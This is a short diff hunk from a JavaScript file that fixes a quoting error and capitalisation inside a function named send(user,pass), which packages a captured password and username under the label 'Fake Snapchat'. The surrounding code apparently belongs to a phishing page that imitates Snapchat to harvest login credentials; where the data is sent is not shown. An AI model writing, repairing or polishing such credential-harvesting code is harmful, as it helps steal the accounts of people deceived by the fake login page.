@@ -32,7 +32,7 @@ function send(user,pass){
             {
                 'PASSWORD': pass,
                 'USERNAME': user,
-                'SITE": "Fake snapchat"
+                'SITE': "Fake Snapchat"
             }
         ]
     })
